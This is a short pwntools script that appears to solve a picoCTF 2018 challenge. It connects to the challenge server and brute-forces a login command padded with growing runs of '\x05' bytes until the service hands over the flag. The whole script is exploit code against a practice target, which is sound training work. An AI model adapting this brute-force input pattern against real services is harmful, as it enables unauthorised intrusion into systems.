from pwn import *


a = remote('2018shell.picoctf.com', 29508)
c = '\x05'
for i in range(2,1000):
	log.info(str(i))
	a.recvuntil('>')
	payload = "login"
	payload += '\x05'*i
	log.info(payload)
	a.sendline(payload)
	log.info(a.recvuntil('>'))
	a.sendline('show')
	info = a.recvuntil('>')
	log.info(info)
	if info.split('[')[1].find('5') != -1:
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
		log.info("POSSIBLE SOLUTION FOUND")
	a.sendline('get-flag')
	info = a.recvuntil('>')
	if info.find('Must') == -1:
		log.info(info)
		break
	a.sendline('reset')
		
